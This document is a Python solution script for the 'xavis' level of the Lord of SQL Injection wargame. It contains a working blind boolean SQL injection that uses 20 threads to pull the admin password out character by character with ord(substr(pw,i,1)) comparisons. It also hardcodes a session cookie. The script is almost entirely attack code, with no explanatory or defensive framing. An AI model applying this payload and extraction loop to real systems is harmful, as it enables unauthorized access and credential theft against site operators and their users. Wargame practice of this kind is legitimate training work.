#!/usr/bin/env python
# -*- coding: utf8 -*-
import requests
import threading
import multiprocessing

key = {}

def run(i):
	url = "https://los.eagle-jump.org/xavis_fd4389515d6540477114ec3c79623afe.php"
	headers = {'Host': 'los.eagle-jump.org', 'Cookie': 'PHPSESSID=etgnhpi5bevt9oc4bsdtdkfg63;'}
	for n in range(255,0,-1):
		payload = "?pw='||(id=\"admin\"%26%26ord(substr(pw,{},1))={})%23".format(i, n)
		r = requests.get(url + payload, headers=headers)
		if( r.text.find("Hello admin") != -1 and n != 0):
			key[i] = n
			print("No.{} Found Key: {}".format(i ,n))
			break

def main():
	threads = []
	threadNum = 20
	for count in range(threadNum):
		key[count] = 0
		threads.append(threading.Thread(target = run, args = (count,)))
		threads[count].start()		

	for count in range(threadNum):
		threads[count].join()

	print("Key:")
	for count in range(threadNum):
		if key[count] != 0:
			print(key[count], end=' ')
	print("")
	for count in range(threadNum):
		if key[count] != 0:
			print(chr(key[count]), end='')

if __name__ == '__main__':
	main()